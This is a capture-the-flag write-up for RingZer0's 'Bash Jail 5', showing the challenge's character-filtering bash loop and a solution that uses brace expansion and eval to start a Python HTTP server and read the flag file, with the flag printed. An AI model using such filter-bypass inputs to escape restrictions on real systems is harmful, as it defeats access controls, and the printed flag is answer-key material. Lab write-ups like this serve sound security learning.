# Bash Jail 5

## Challenge Details 

- **CTF:** RingZer0
- **Category:** Jail Escaping
- **Points:** 6

## Provided Materials

- SSH credentials

## Solution

Challenge bash code:

```sh
WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

function check_space {
	if [[ $1 == *[bdksctr'?''*''/''<''>''&''$']* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output=`$input < /dev/null` &>/dev/null
		echo "Command executed"
	fi
done 
```

This challenge has more deprecated characters comparing to `level4`, so we can't use `python -m SimpleHTTPServer 12345` directly, but here comes [Brace Expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html) into play.

`level4`:

```sh
Your input:
eval eval py{o..u}hon\\ -m\\ SimpleHTTPSe{q..v}ve{q..v}\\ 12345\\;
```

`level1`:

```sh
Your input:
bash
level1@jail-bash:~$ python >&0
>>> import urllib2
>>> urllib2.urlopen("http://127.0.0.1:12345/flag.txt").read()
'FLAG-PcttpB5gR3faGUnuf6i1VP90ZMj42IEn\n'
```


## Final Flag

`FLAG-PcttpB5gR3faGUnuf6i1VP90ZMj42IEn`

*Created by [bu19akov](https://github.com/bu19akov)*